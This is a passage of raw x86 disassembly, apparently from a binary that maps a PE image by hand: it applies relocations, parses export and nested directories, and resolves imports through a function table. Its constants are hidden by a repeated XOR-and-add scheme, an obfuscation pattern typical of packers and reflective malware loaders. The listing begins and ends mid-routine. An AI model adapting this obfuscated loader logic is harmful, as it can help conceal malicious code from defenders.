  41e5a5:	mov    DWORD PTR [ebp-0x60],eax
  41e5a8:	lea    eax,[ebp-0x70]
  41e5ab:	push   eax
  41e5ac:	mov    eax,DWORD PTR [ebp+0x8]
  41e5af:	xor    eax,esi
  41e5b1:	add    eax,edi
  41e5b3:	push   eax
  41e5b4:	mov    eax,DWORD PTR [ebp+0x20]
  41e5b7:	add    eax,0xee
  41e5bc:	push   eax
  41e5bd:	mov    eax,DWORD PTR [ebp+0x20]
  41e5c0:	mov    eax,DWORD PTR [eax+0x198]
  41e5c6:	push   DWORD PTR [eax]
  41e5c8:	mov    eax,DWORD PTR [ebp+0x10]
  41e5cb:	call   eax
  41e5cd:	mov    eax,DWORD PTR [ebp+0x20]
  41e5d0:	mov    eax,DWORD PTR [eax+0x180]
  41e5d6:	add    eax,DWORD PTR [ebp+0xc]
  41e5d9:	mov    ecx,DWORD PTR [ebp+0xc]
  41e5dc:	push   DWORD PTR [ebp+0x18]
  41e5df:	mov    DWORD PTR [eax],ecx
  41e5e1:	push   DWORD PTR [ebp+0x14]
  41e5e4:	push   DWORD PTR [ebp+0x1c]
  41e5e7:	call   ebx
  41e5e9:	mov    ecx,DWORD PTR [ebp+0xc]
  41e5ec:	add    ecx,DWORD PTR [ebp+0x20]
  41e5ef:	lea    eax,[ebp+0x4]
  41e5f2:	mov    DWORD PTR [ebp+0x20],ecx
  41e5f5:	mov    ecx,DWORD PTR [ebp+0x20]
  41e5f8:	mov    ecx,DWORD PTR [ebp+0x20]
  41e5fb:	mov    edx,DWORD PTR [ecx+0x190]
  41e601:	mov    ecx,DWORD PTR [ebp+0x20]
  41e604:	mov    ecx,DWORD PTR [ecx+0x18c]
  41e60a:	mov    esi,DWORD PTR [ecx]
  41e60c:	cmp    DWORD PTR [eax],esi
  41e60e:	jb     0x41e62f
  41e610:	mov    esi,DWORD PTR [edx]
  41e612:	mov    edi,DWORD PTR [edx]
  41e614:	mov    esi,DWORD PTR [esi+0x3c]
  41e617:	lea    esi,[edi+esi*1+0x50]
  41e61b:	mov    edi,DWORD PTR [ecx]
  41e61d:	add    edi,DWORD PTR [esi]
  41e61f:	cmp    DWORD PTR [eax],edi
  41e621:	jae    0x41e62f
  41e623:	mov    esi,DWORD PTR [ecx]
  41e625:	mov    ecx,DWORD PTR [eax]
  41e627:	mov    edx,DWORD PTR [edx]
  41e629:	sub    ecx,esi
  41e62b:	add    edx,ecx
  41e62d:	mov    DWORD PTR [eax],edx
  41e62f:	mov    eax,DWORD PTR [ebp+0xc]
  41e632:	jmp    0x41e636
  41e634:	xor    eax,eax
  41e636:	pop    edi
  41e637:	pop    esi
  41e638:	pop    ebx
  41e639:	leave  
  41e63a:	ret    0x1c
  41e63d:	push   ebp
  41e63e:	mov    ebp,esp
  41e640:	sub    esp,0x1c
  41e643:	push   esi
  41e644:	mov    esi,eax
  41e646:	mov    eax,DWORD PTR [ecx+0x190]
  41e64c:	cmp    DWORD PTR [eax],0x0
  41e64f:	je     0x41e75f
  41e655:	test   edx,edx
  41e657:	je     0x41e75f
  41e65d:	test   esi,esi
  41e65f:	je     0x41e75f
  41e665:	mov    eax,DWORD PTR [esi+0x88]
  41e66b:	test   eax,eax
  41e66d:	je     0x41e75a
  41e673:	cmp    DWORD PTR [esi+0x8c],0x10
  41e67a:	je     0x41e75a
  41e680:	cmp    DWORD PTR [esi+0x34],edx
  41e683:	je     0x41e75a
  41e689:	mov    esi,DWORD PTR [ecx+0x18c]
  41e68f:	and    DWORD PTR [ebp-0x10],0x0
  41e693:	mov    ecx,edx
  41e695:	sub    ecx,DWORD PTR [esi]
  41e697:	add    eax,edx
  41e699:	movzx  edx,WORD PTR [eax+0xc]
  41e69d:	mov    DWORD PTR [ebp-0x1c],ecx
  41e6a0:	movzx  ecx,WORD PTR [eax+0xe]
  41e6a4:	add    ecx,edx
  41e6a6:	je     0x41e75a
  41e6ac:	lea    ecx,[eax+0x14]
  41e6af:	push   ebx
  41e6b0:	mov    DWORD PTR [ebp-0x18],ecx
  41e6b3:	mov    esi,0x7fffffff
  41e6b8:	push   edi
  41e6b9:	test   DWORD PTR [ecx],esi
  41e6bb:	je     0x41e73c
  41e6bd:	mov    edx,DWORD PTR [ecx]
  41e6bf:	and    DWORD PTR [ebp-0xc],0x0
  41e6c3:	and    edx,esi
  41e6c5:	add    edx,eax
  41e6c7:	movzx  edi,WORD PTR [edx+0xe]
  41e6cb:	movzx  ebx,WORD PTR [edx+0xc]
  41e6cf:	add    edi,ebx
  41e6d1:	je     0x41e73c
  41e6d3:	lea    ecx,[edx+0x14]
  41e6d6:	mov    DWORD PTR [ebp-0x14],ecx
  41e6d9:	test   DWORD PTR [ecx],esi
  41e6db:	je     0x41e71e
  41e6dd:	mov    ecx,DWORD PTR [ecx]
  41e6df:	and    DWORD PTR [ebp-0x8],0x0
  41e6e3:	and    ecx,esi
  41e6e5:	add    ecx,eax
  41e6e7:	movzx  edi,WORD PTR [ecx+0xe]
  41e6eb:	movzx  ebx,WORD PTR [ecx+0xc]
  41e6ef:	add    edi,ebx
  41e6f1:	je     0x41e71e
  41e6f3:	lea    edi,[ecx+0x14]
  41e6f6:	mov    DWORD PTR [ebp-0x4],edi
  41e6f9:	mov    edi,DWORD PTR [ebp-0x4]
  41e6fc:	mov    edi,DWORD PTR [edi]
  41e6fe:	test   edi,edi
  41e700:	je     0x41e708
  41e702:	mov    ebx,DWORD PTR [ebp-0x1c]
  41e705:	add    DWORD PTR [edi+eax*1],ebx
  41e708:	movzx  edi,WORD PTR [ecx+0xe]
  41e70c:	movzx  ebx,WORD PTR [ecx+0xc]
  41e710:	inc    DWORD PTR [ebp-0x8]
  41e713:	add    DWORD PTR [ebp-0x4],0x8
  41e717:	add    edi,ebx
  41e719:	cmp    DWORD PTR [ebp-0x8],edi
  41e71c:	jb     0x41e6f9
  41e71e:	movzx  edi,WORD PTR [edx+0xe]
  41e722:	movzx  ebx,WORD PTR [edx+0xc]
  41e726:	mov    ecx,DWORD PTR [ebp-0x14]
  41e729:	inc    DWORD PTR [ebp-0xc]
  41e72c:	add    ecx,0x8
  41e72f:	add    edi,ebx
  41e731:	mov    DWORD PTR [ebp-0x14],ecx
  41e734:	cmp    DWORD PTR [ebp-0xc],edi
  41e737:	jb     0x41e6d9
  41e739:	mov    ecx,DWORD PTR [ebp-0x18]
  41e73c:	movzx  edx,WORD PTR [eax+0xe]
  41e740:	movzx  edi,WORD PTR [eax+0xc]
  41e744:	inc    DWORD PTR [ebp-0x10]
  41e747:	add    ecx,0x8
  41e74a:	add    edx,edi
  41e74c:	mov    DWORD PTR [ebp-0x18],ecx
  41e74f:	cmp    DWORD PTR [ebp-0x10],edx
  41e752:	jb     0x41e6b9
  41e758:	pop    edi
  41e759:	pop    ebx
  41e75a:	xor    eax,eax
  41e75c:	inc    eax
  41e75d:	jmp    0x41e761
  41e75f:	xor    eax,eax
  41e761:	pop    esi
  41e762:	leave  
  41e763:	ret    
  41e764:	push   ebp
  41e765:	mov    ebp,esp
  41e767:	mov    ecx,DWORD PTR [ecx+0x190]
  41e76d:	mov    eax,DWORD PTR [ebp+0xc]
  41e770:	sub    esp,0x10
  41e773:	push   ebx
  41e774:	xor    ebx,ebx
  41e776:	push   esi
  41e777:	push   edi
  41e778:	cmp    DWORD PTR [ecx],ebx
  41e77a:	je     0x41e802
  41e780:	cmp    eax,ebx
  41e782:	je     0x41e802
  41e784:	cmp    DWORD PTR [eax+0x78],ebx
  41e787:	jne    0x41e78e
  41e789:	xor    eax,eax
  41e78b:	inc    eax
  41e78c:	jmp    0x41e804
  41e78e:	mov    eax,DWORD PTR [eax+0x78]
  41e791:	add    eax,DWORD PTR [ebp+0x8]
  41e794:	mov    ecx,DWORD PTR [eax+0x1c]
  41e797:	mov    edx,DWORD PTR [eax+0x24]
  41e79a:	mov    esi,DWORD PTR [eax+0x14]
  41e79d:	mov    edi,DWORD PTR [eax+0x18]
  41e7a0:	add    ecx,DWORD PTR [ebp+0x8]
  41e7a3:	add    edx,DWORD PTR [ebp+0x8]
  41e7a6:	mov    DWORD PTR [ebp-0x4],esi
  41e7a9:	cmp    esi,edi
  41e7ab:	ja     0x41e7b0
  41e7ad:	mov    DWORD PTR [ebp-0x4],edi
  41e7b0:	mov    DWORD PTR [ebp-0x8],ebx
  41e7b3:	cmp    DWORD PTR [ebp-0x4],ebx
  41e7b6:	jbe    0x41e789
  41e7b8:	cmp    ebx,DWORD PTR [eax+0x14]
  41e7bb:	jae    0x41e7c3
  41e7bd:	movzx  esi,WORD PTR [edx+ebx*2]
  41e7c1:	jmp    0x41e7c5
  41e7c3:	mov    esi,ebx
  41e7c5:	lea    esi,[ecx+esi*4]
  41e7c8:	mov    edi,DWORD PTR [esi]
  41e7ca:	test   edi,edi
  41e7cc:	je     0x41e7f7
  41e7ce:	add    edi,DWORD PTR [ebp+0x8]
  41e7d1:	mov    DWORD PTR [ebp-0x10],edi
  41e7d4:	cmp    edi,eax
  41e7d6:	jbe    0x41e7e8
  41e7d8:	mov    ebx,DWORD PTR [ebp+0xc]
  41e7db:	mov    ebx,DWORD PTR [ebx+0x7c]
  41e7de:	add    ebx,eax
  41e7e0:	cmp    edi,ebx
  41e7e2:	jae    0x41e7e8
  41e7e4:	mov    esi,DWORD PTR [esi]
  41e7e6:	jmp    0x41e7f0
  41e7e8:	sub    edi,DWORD PTR [ebp+0x8]
  41e7eb:	mov    DWORD PTR [esi],edi
  41e7ed:	mov    esi,DWORD PTR [ebp-0x10]
  41e7f0:	test   esi,esi
  41e7f2:	je     0x41e802
  41e7f4:	mov    ebx,DWORD PTR [ebp-0x8]
  41e7f7:	inc    ebx
  41e7f8:	mov    DWORD PTR [ebp-0x8],ebx
  41e7fb:	cmp    ebx,DWORD PTR [ebp-0x4]
  41e7fe:	jb     0x41e7b8
  41e800:	jmp    0x41e789
  41e802:	xor    eax,eax
  41e804:	pop    edi
  41e805:	pop    esi
  41e806:	pop    ebx
  41e807:	leave  
  41e808:	ret    0x8
  41e80b:	push   ebp
  41e80c:	mov    ebp,esp
  41e80e:	sub    esp,0x2c
  41e811:	mov    edx,0xf89c8585
  41e816:	mov    DWORD PTR [ebp-0x4],edx
  41e819:	mov    DWORD PTR [ebp-0x8],0xf89c8584
  41e820:	mov    eax,DWORD PTR [ebp-0x4]
  41e823:	mov    ecx,DWORD PTR [ebp-0x4]
  41e826:	mov    ecx,DWORD PTR [ebp-0x4]
  41e829:	mov    ecx,DWORD PTR [ebp-0x4]
  41e82c:	mov    ecx,DWORD PTR [ebp-0x4]
  41e82f:	mov    ecx,DWORD PTR [ebp-0x4]
  41e832:	push   ebx
  41e833:	mov    ebx,DWORD PTR [ebp+0x10]
  41e836:	push   esi
  41e837:	mov    esi,0x751089b
  41e83c:	mov    DWORD PTR [ebp-0x10],0x352eb0f
  41e843:	mov    ecx,DWORD PTR [ebp-0x4]
  41e846:	mov    ebx,DWORD PTR [ebx+0x190]
  41e84c:	push   edi
  41e84d:	mov    edi,0x3272e2
  41e852:	xor    ecx,esi
  41e854:	xor    eax,esi
  41e856:	add    eax,edi
  41e858:	add    ecx,edi
  41e85a:	mov    DWORD PTR [ebp-0x18],eax
  41e85d:	cmp    ecx,DWORD PTR [ebx]
  41e85f:	je     0x41eae0
  41e865:	mov    ebx,DWORD PTR [ebp-0x4]
  41e868:	mov    ecx,DWORD PTR [ebp+0xc]
  41e86b:	xor    ebx,esi
  41e86d:	add    ebx,edi
  41e86f:	cmp    ebx,ecx
  41e871:	je     0x41eae0
  41e877:	mov    ebx,DWORD PTR [ebp-0x4]
  41e87a:	mov    ecx,DWORD PTR [ecx+0x80]
  41e880:	xor    ebx,esi
  41e882:	add    ebx,edi
  41e884:	cmp    ecx,ebx
  41e886:	je     0x41eadb
  41e88c:	add    ecx,DWORD PTR [ebp+0x8]
  41e88f:	mov    DWORD PTR [ebp-0x2c],ecx
  41e892:	mov    ebx,edx
  41e894:	xor    ebx,esi
  41e896:	add    ebx,edi
  41e898:	mov    DWORD PTR [ebp-0x10],ebx
  41e89b:	mov    ebx,DWORD PTR [ebp-0x10]
  41e89e:	cmp    ebx,edx
  41e8a0:	je     0x41e8b4
  41e8a2:	mov    edx,DWORD PTR [ebp-0x10]
  41e8a5:	mov    ebx,DWORD PTR [ebp-0x4]
  41e8a8:	imul   edx,edx,0x14
  41e8ab:	xor    ebx,esi
  41e8ad:	add    ebx,edi
  41e8af:	cmp    DWORD PTR [edx+ecx*1],ebx
  41e8b2:	jne    0x41e8cb
  41e8b4:	mov    edx,DWORD PTR [ebp-0x10]
  41e8b7:	mov    ebx,DWORD PTR [ebp-0x4]
  41e8ba:	imul   edx,edx,0x14
  41e8bd:	xor    ebx,esi
  41e8bf:	add    ebx,edi
  41e8c1:	cmp    DWORD PTR [edx+ecx*1+0x10],ebx
  41e8c5:	je     0x41eacd
  41e8cb:	mov    eax,DWORD PTR [ebp-0x4]
  41e8ce:	mov    ebx,DWORD PTR [ebp-0x4]
  41e8d1:	mov    eax,DWORD PTR [ebp-0x10]
  41e8d4:	imul   eax,eax,0x14
  41e8d7:	add    eax,ecx
  41e8d9:	mov    ecx,DWORD PTR [eax+0x10]
  41e8dc:	add    ecx,DWORD PTR [ebp+0x8]
  41e8df:	xor    ebx,esi
  41e8e1:	mov    DWORD PTR [ebp-0x1c],ecx
  41e8e4:	mov    ecx,DWORD PTR [ebp-0x4]
  41e8e7:	mov    edx,DWORD PTR [ebp-0x4]
  41e8ea:	xor    ecx,esi
  41e8ec:	add    ecx,edi
  41e8ee:	xor    edx,esi
  41e8f0:	mov    DWORD PTR [ebp-0x24],ecx
  41e8f3:	mov    ecx,DWORD PTR [eax]
  41e8f5:	add    edx,edi
  41e8f7:	add    ebx,edi
  41e8f9:	cmp    ecx,edx
  41e8fb:	je     0x41e903
  41e8fd:	add    ecx,DWORD PTR [ebp+0x8]
  41e900:	mov    DWORD PTR [ebp-0x24],ecx
  41e903:	mov    ecx,DWORD PTR [ebp-0x4]
  41e906:	xor    ecx,esi
  41e908:	add    ecx,DWORD PTR [eax+0xc]
  41e90b:	mov    eax,DWORD PTR [ebp+0x8]
  41e90e:	lea    eax,[ecx+eax*1+0x3272e2]
  41e915:	mov    DWORD PTR [ebp+0xc],eax
  41e918:	mov    DWORD PTR [ebp-0x28],0xf89c85b8
  41e91f:	mov    eax,DWORD PTR [ebp+0x10]
  41e922:	push   DWORD PTR [ebp+0xc]
  41e925:	mov    eax,DWORD PTR [eax+0x1d8]
  41e92b:	call   DWORD PTR [eax]
  41e92d:	mov    ecx,DWORD PTR [ebp-0x4]
  41e930:	xor    ecx,esi
  41e932:	add    ecx,edi
  41e934:	mov    DWORD PTR [ebp-0xc],eax
  41e937:	cmp    ecx,eax
  41e939:	jne    0x41e94d
  41e93b:	mov    eax,DWORD PTR [ebp+0x10]
  41e93e:	push   DWORD PTR [ebp+0xc]
  41e941:	mov    eax,DWORD PTR [eax+0x1d8]
  41e947:	call   DWORD PTR [eax+0xc]
  41e94a:	mov    DWORD PTR [ebp-0xc],eax
  41e94d:	mov    DWORD PTR [ebp-0x20],0x7f661b0c
  41e954:	mov    DWORD PTR [ebp-0x20],0xf89c999c
  41e95b:	mov    eax,DWORD PTR [ebp-0x4]
  41e95e:	xor    eax,esi
  41e960:	add    eax,edi
  41e962:	cmp    eax,DWORD PTR [ebp-0xc]
  41e965:	jne    0x41e98a
  41e967:	mov    eax,DWORD PTR [ebp-0x8]
  41e96a:	mov    ecx,DWORD PTR [ebp-0x20]
  41e96d:	xor    eax,esi
  41e96f:	xor    ecx,esi
  41e971:	lea    ebx,[ebx+eax*1+0x3272e2]
  41e978:	mov    eax,DWORD PTR [ebp+0x10]
  41e97b:	mov    eax,DWORD PTR [eax+0x1d8]
  41e981:	add    ecx,edi
  41e983:	imul   ecx,ebx
  41e986:	push   ecx
  41e987:	call   DWORD PTR [eax+0x24]
  41e98a:	mov    eax,DWORD PTR [ebp-0x4]
  41e98d:	xor    eax,esi
  41e98f:	add    eax,edi
  41e991:	cmp    eax,DWORD PTR [ebp-0xc]
  41e994:	jne    0x41e9a5
  41e996:	mov    eax,DWORD PTR [ebp-0x28]
  41e999:	xor    eax,esi
  41e99b:	add    eax,edi
  41e99d:	cmp    ebx,eax
  41e99f:	jbe    0x41e91f
  41e9a5:	mov    eax,DWORD PTR [ebp-0x4]
  41e9a8:	xor    eax,esi
  41e9aa:	add    eax,edi
  41e9ac:	cmp    eax,DWORD PTR [ebp-0xc]
  41e9af:	jne    0x41e9c8
  41e9b1:	mov    eax,DWORD PTR [ebp-0x8]
  41e9b4:	mov    ecx,DWORD PTR [ebp-0x18]
  41e9b7:	xor    eax,esi
  41e9b9:	lea    eax,[ecx+eax*1+0x3272e2]
  41e9c0:	mov    DWORD PTR [ebp-0x18],eax
  41e9c3:	jmp    0x41eab7
  41e9c8:	mov    DWORD PTR [ebp-0x14],0x1121b0d
  41e9cf:	mov    DWORD PTR [ebp+0xc],0xe042d0f
  41e9d6:	mov    ebx,DWORD PTR [ebp-0x4]
  41e9d9:	xor    ebx,esi
  41e9db:	add    ebx,edi
  41e9dd:	jmp    0x41eaa4
  41e9e2:	mov    eax,DWORD PTR [ebp-0x4]
  41e9e5:	xor    eax,esi
  41e9e7:	add    eax,edi
  41e9e9:	mov    DWORD PTR [ebp-0x14],eax
  41e9ec:	mov    eax,DWORD PTR [ebp-0x4]
  41e9ef:	xor    eax,esi
  41e9f1:	add    eax,edi
  41e9f3:	mov    DWORD PTR [ebp+0xc],eax
  41e9f6:	mov    ecx,DWORD PTR [ebp-0x4]
  41e9f9:	mov    eax,DWORD PTR [ebp-0x24]
  41e9fc:	xor    ecx,esi
  41e9fe:	add    ecx,edi
  41ea00:	cmp    ecx,eax
  41ea02:	je     0x41ea0a
  41ea04:	mov    eax,DWORD PTR [eax+ebx*4]
  41ea07:	mov    DWORD PTR [ebp-0x14],eax
  41ea0a:	mov    eax,DWORD PTR [ebp-0x1c]
  41ea0d:	mov    eax,DWORD PTR [eax+ebx*4]
  41ea10:	mov    DWORD PTR [ebp+0xc],eax
  41ea13:	mov    eax,DWORD PTR [ebp-0x4]
  41ea16:	mov    ecx,DWORD PTR [ebp-0x14]
  41ea19:	xor    eax,esi
  41ea1b:	add    eax,edi
  41ea1d:	cmp    eax,ecx
  41ea1f:	je     0x41ea4a
  41ea21:	mov    eax,DWORD PTR [ebp-0x4]
  41ea24:	mov    ecx,DWORD PTR [ebp-0x14]
  41ea27:	xor    eax,esi
  41ea29:	add    eax,edi
  41ea2b:	shr    ecx,0x1f
  41ea2e:	cmp    eax,ecx
  41ea30:	je     0x41ea4a
  41ea32:	mov    ecx,DWORD PTR [ebp-0x14]
  41ea35:	mov    eax,DWORD PTR [ebp+0x10]
  41ea38:	mov    eax,DWORD PTR [eax+0x1d8]
  41ea3e:	movzx  ecx,cx
  41ea41:	push   ecx
  41ea42:	push   DWORD PTR [ebp-0xc]
  41ea45:	call   DWORD PTR [eax+0x8]
  41ea48:	jmp    0x41ea63
  41ea4a:	mov    eax,DWORD PTR [ebp+0xc]
  41ea4d:	add    eax,DWORD PTR [ebp+0x8]
  41ea50:	mov    ecx,DWORD PTR [ebp+0x10]
  41ea53:	mov    ecx,DWORD PTR [ecx+0x1d8]
  41ea59:	add    eax,0x2
  41ea5c:	push   eax
  41ea5d:	push   DWORD PTR [ebp-0xc]
  41ea60:	call   DWORD PTR [ecx+0x8]
  41ea63:	mov    DWORD PTR [ebp+0xc],eax
  41ea66:	mov    eax,DWORD PTR [ebp-0x4]
  41ea69:	mov    ecx,DWORD PTR [ebp+0xc]
  41ea6c:	xor    eax,esi
  41ea6e:	add    eax,edi
  41ea70:	cmp    eax,ecx
  41ea72:	mov    eax,DWORD PTR [ebp-0x8]
  41ea75:	jne    0x41ea88
  41ea77:	mov    ecx,DWORD PTR [ebp-0x18]
  41ea7a:	xor    eax,esi
  41ea7c:	lea    eax,[ecx+eax*1+0x3272e2]
  41ea83:	mov    DWORD PTR [ebp-0x18],eax
  41ea86:	jmp    0x41ea98
  41ea88:	mov    ecx,DWORD PTR [ebp+0xc]
  41ea8b:	xor    eax,esi
  41ea8d:	add    eax,edi
  41ea8f:	imul   eax,ecx
  41ea92:	mov    ecx,DWORD PTR [ebp-0x1c]
  41ea95:	mov    DWORD PTR [ecx+ebx*4],eax
  41ea98:	mov    eax,DWORD PTR [ebp-0x8]
  41ea9b:	xor    eax,esi
  41ea9d:	lea    ebx,[ebx+eax*1+0x3272e2]
  41eaa4:	mov    eax,DWORD PTR [ebp-0x4]
  41eaa7:	mov    ecx,DWORD PTR [ebp-0x1c]
  41eaaa:	xor    eax,esi
  41eaac:	add    eax,edi
  41eaae:	cmp    DWORD PTR [ecx+ebx*4],eax
  41eab1:	jne    0x41e9e2
  41eab7:	mov    edx,DWORD PTR [ebp-0x10]
  41eaba:	mov    eax,DWORD PTR [ebp-0x18]
  41eabd:	mov    ecx,DWORD PTR [ebp-0x2c]
  41eac0:	sub    edx,0x3272e1
  41eac6:	xor    edx,esi
  41eac8:	jmp    0x41e892
  41eacd:	mov    ecx,DWORD PTR [ebp-0x4]
  41ead0:	xor    ecx,esi
  41ead2:	add    ecx,edi
  41ead4:	cmp    eax,ecx
  41ead6:	mov    eax,DWORD PTR [ebp-0x4]
  41ead9:	jne    0x41eae3
  41eadb:	mov    eax,DWORD PTR [ebp-0x8]
  41eade:	jmp    0x41eae3
  41eae0:	mov    eax,DWORD PTR [ebp-0x4]
  41eae3:	xor    eax,esi
  41eae5:	add    eax,edi
  41eae7:	pop    edi
  41eae8:	pop    esi
  41eae9:	pop    ebx
  41eaea:	leave  
  41eaeb:	ret    0xc
  41eaee:	push   ebp
  41eaef:	mov    ebp,esp
  41eaf1:	sub    esp,0x28
  41eaf4:	mov    DWORD PTR [ebp-0x4],0xf89c8585
  41eafb:	mov    DWORD PTR [ebp-0x28],0xf89c8584
  41eb02:	mov    eax,DWORD PTR [ebp+0xc]
  41eb05:	mov    DWORD PTR [ebp+0xc],eax
  41eb08:	push   esi
  41eb09:	mov    eax,eax
  41eb0b:	mov    eax,DWORD PTR [ebp-0x4]
  41eb0e:	mov    esi,DWORD PTR [ebp+0x8]
  41eb11:	mov    ecx,0x751089b
  41eb16:	xor    eax,ecx
  41eb18:	mov    edx,0x3272e2
  41eb1d:	add    eax,edx
  41eb1f:	cmp    esi,eax
  41eb21:	je     0x41ec48
  41eb27:	mov    eax,DWORD PTR [ebp+0x8]
  41eb2a:	mov    esi,DWORD PTR [ebp+0x8]
  41eb2d:	add    esi,DWORD PTR [eax+0x3c]
  41eb30:	push   edi
  41eb31:	mov    DWORD PTR [ebp+0xc],esi
  41eb34:	mov    DWORD PTR [ebp-0x1c],0xf89c85b8
  41eb3b:	mov    eax,DWORD PTR [ebp-0x1c]
  41eb3e:	mov    esi,DWORD PTR [ebp-0x4]
  41eb41:	mov    edi,DWORD PTR [ebp+0xc]
  41eb44:	xor    esi,ecx
  41eb46:	xor    eax,ecx
  41eb48:	add    esi,edx
  41eb4a:	cmp    DWORD PTR [edi+eax*8+0x1939788],esi
  41eb51:	je     0x41ec42
  41eb57:	mov    esi,DWORD PTR [ebp+0xc]
  41eb5a:	mov    eax,DWORD PTR [ebp+0x8]
  41eb5d:	add    eax,DWORD PTR [esi+0xa0]
  41eb63:	mov    esi,DWORD PTR [ebp+0x8]
  41eb66:	mov    edi,DWORD PTR [ebp+0xc]
  41eb69:	sub    esi,DWORD PTR [edi+0x34]
  41eb6c:	mov    edi,DWORD PTR [ebp-0x4]
  41eb6f:	xor    edi,ecx
  41eb71:	add    edi,edx
  41eb73:	mov    DWORD PTR [ebp-0x24],esi
  41eb76:	cmp    esi,edi
  41eb78:	je     0x41ec42
  41eb7e:	mov    esi,DWORD PTR [ebp-0x4]
  41eb81:	xor    esi,ecx
  41eb83:	add    esi,edx
  41eb85:	mov    DWORD PTR [ebp-0x8],esi
  41eb88:	push   ebx
  41eb89:	mov    DWORD PTR [ebp-0x10],0xf89c85ba
  41eb90:	jmp    0x41ec2c
  41eb95:	mov    esi,DWORD PTR [ebp-0x4]
  41eb98:	xor    esi,ecx
  41eb9a:	lea    edi,[ebx-0x8]
  41eb9d:	add    esi,edx
  41eb9f:	shr    edi,1
  41eba1:	cmp    esi,edi
  41eba3:	jae    0x41ec12
  41eba5:	sub    edi,esi
  41eba7:	lea    ebx,[eax+esi*2+0x8]
  41ebab:	mov    DWORD PTR [ebp-0x18],edi
  41ebae:	movzx  esi,WORD PTR [ebx]
  41ebb1:	and    esi,0xfff
  41ebb7:	mov    DWORD PTR [ebp-0x14],esi
  41ebba:	mov    edi,DWORD PTR [ebp-0x14]
  41ebbd:	mov    esi,DWORD PTR [eax]
  41ebbf:	sub    esi,edx
  41ebc1:	add    edi,esi
  41ebc3:	movzx  esi,WORD PTR [ebx]
  41ebc6:	shr    esi,0xc
  41ebc9:	xor    edi,ecx
  41ebcb:	mov    DWORD PTR [ebp-0x20],edi
  41ebce:	mov    DWORD PTR [ebp-0x14],esi
  41ebd1:	mov    esi,DWORD PTR [ebp-0x20]
  41ebd4:	mov    edi,DWORD PTR [ebp+0x8]
  41ebd7:	xor    esi,ecx
  41ebd9:	lea    esi,[esi+edi*1+0x3272e2]
  41ebe0:	mov    DWORD PTR [ebp-0x20],esi
  41ebe3:	mov    esi,DWORD PTR [ebp-0x10]
  41ebe6:	mov    edi,DWORD PTR [ebp-0x14]
  41ebe9:	xor    esi,ecx
  41ebeb:	add    esi,edx
  41ebed:	cmp    edi,esi
  41ebef:	jne    0x41ec07
  41ebf1:	mov    esi,DWORD PTR [ebp-0x10]
  41ebf4:	mov    edi,DWORD PTR [ebp-0x14]
  41ebf7:	xor    esi,ecx
  41ebf9:	add    esi,edx
  41ebfb:	cmp    edi,esi
  41ebfd:	jne    0x41ec07
  41ebff:	mov    esi,DWORD PTR [ebp-0x20]
  41ec02:	mov    edi,DWORD PTR [ebp-0x24]
  41ec05:	add    DWORD PTR [esi],edi
  41ec07:	add    ebx,0x2
  41ec0a:	dec    DWORD PTR [ebp-0x18]
  41ec0d:	jne    0x41ebae
  41ec0f:	mov    ebx,DWORD PTR [ebp-0xc]
  41ec12:	add    DWORD PTR [ebp-0x8],ebx
  41ec15:	mov    esi,DWORD PTR [ebp-0x1c]
  41ec18:	mov    edi,DWORD PTR [ebp-0x8]
  41ec1b:	mov    ebx,DWORD PTR [ebp+0xc]
  41ec1e:	xor    esi,ecx
  41ec20:	cmp    edi,DWORD PTR [ebx+esi*8+0x193978c]
  41ec27:	jae    0x41ec41
  41ec29:	add    eax,DWORD PTR [ebp-0xc]
  41ec2c:	mov    esi,DWORD PTR [ebp-0x4]
  41ec2f:	mov    ebx,DWORD PTR [eax+0x4]
  41ec32:	xor    esi,ecx
  41ec34:	add    esi,edx
  41ec36:	mov    DWORD PTR [ebp-0xc],ebx
  41ec39:	cmp    ebx,esi
  41ec3b:	jne    0x41eb95
  41ec41:	pop    ebx
  41ec42:	mov    eax,DWORD PTR [ebp-0x28]
  41ec45:	pop    edi
  41ec46:	jmp    0x41ec4b
  41ec48:	mov    eax,DWORD PTR [ebp-0x4]
  41ec4b:	xor    eax,ecx
  41ec4d:	add    eax,edx
  41ec4f:	pop    esi
  41ec50:	leave  
  41ec51:	ret    0x8
  41ec54:	push   ebp
  41ec55:	mov    ebp,esp
  41ec57:	sub    esp,0xcc
  41ec5d:	mov    DWORD PTR [ebp-0x4],0xf89c8585
  41ec64:	mov    DWORD PTR [ebp-0x24],0xf89c8584
  41ec6b:	mov    eax,DWORD PTR [ebp-0x4]
  41ec6e:	push   ebx
  41ec6f:	push   esi
  41ec70:	mov    esi,0x751089b
  41ec75:	xor    eax,esi
  41ec77:	push   edi
  41ec78:	mov    edi,0x3272e2
  41ec7d:	add    eax,edi
  41ec7f:	mov    DWORD PTR [ebp-0x1c],eax
  41ec82:	mov    eax,DWORD PTR [ebp-0x4]
  41ec85:	xor    eax,esi
  41ec87:	add    eax,edi
  41ec89:	mov    DWORD PTR [ebp-0x8],eax
  41ec8c:	mov    ebx,DWORD PTR [ebp+0x20]
  41ec8f:	mov    eax,DWORD PTR [ebp-0x14]
  41ec92:	mov    ecx,DWORD PTR [ebp-0x14]
  41ec95:	xor    eax,ecx
  41ec97:	mov    DWORD PTR [ebp-0x14],eax
  41ec9a:	add    DWORD PTR [ebp-0x14],0xf89cb585
  41eca1:	mov    eax,DWORD PTR [ebp-0xc]
  41eca4:	mov    ecx,DWORD PTR [ebp-0xc]
  41eca7:	xor    eax,ecx
  41eca9:	mov    DWORD PTR [ebp-0xc],eax
  41ecac:	add    DWORD PTR [ebp-0xc],0xf89c85c5
  41ecb3:	mov    eax,DWORD PTR [ebp-0x10]
  41ecb6:	mov    ecx,DWORD PTR [ebp-0x10]
  41ecb9:	xor    eax,ecx
  41ecbb:	mov    DWORD PTR [ebp-0x10],eax
  41ecbe:	add    DWORD PTR [ebp-0x10],0xf89c85b9
  41ecc5:	mov    eax,DWORD PTR [ebp-0x20]
  41ecc8:	mov    ecx,DWORD PTR [ebp-0x20]
  41eccb:	xor    eax,ecx
  41eccd:	mov    DWORD PTR [ebp-0x20],eax
  41ecd0:	add    DWORD PTR [ebp-0x20],0xf89f0585
  41ecd7:	mov    eax,0x9471
  41ecdc:	mov    WORD PTR [ebp+0x20],ax
  41ece0:	mov    eax,DWORD PTR [ebp+0x8]
  41ece3:	test   eax,eax
  41ece5:	je     0x41f140
  41eceb:	mov    eax,DWORD PTR [ebp+0xc]
  41ecee:	test   eax,eax
  41ecf0:	je     0x41f140
  41ecf6:	mov    eax,DWORD PTR [ebp+0x18]
  41ecf9:	test   eax,eax
  41ecfb:	je     0x41f140
